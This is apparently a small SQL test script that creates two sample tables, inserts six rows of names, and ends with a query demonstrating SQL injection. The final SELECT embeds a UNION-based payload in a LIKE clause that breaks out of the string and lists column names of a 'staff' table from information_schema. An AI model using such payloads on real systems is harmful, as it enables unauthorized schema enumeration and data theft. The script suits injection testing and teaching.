CREATE TABLE sql_test_a 
( 
    ID         VARCHAR(4000 ), 
    FIRST_NAME VARCHAR(200 ), 
    LAST_NAME  VARCHAR(200 )  
); 

CREATE TABLE sql_test_b 
( 
    ID         VARCHAR(4000 )
);

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('1', 'John', 'Snow');

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('2', 'Mike', 'Tyson');

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('3', 'Bill', 'Keaton');

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('4', 'Greg', 'Mercury');

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('5', 'Steve', 'Jobs');

INSERT INTO sql_test_a (ID, FIRST_NAME, LAST_NAME) VALUES ('6', 'Johhny', 'Depp');

SELECT *
FROM sql_test_a where first_name like '%
%' union select 1,2, column_name from information_schema.columns where table_name = 'staff' order by 3 and '1%'='1
%';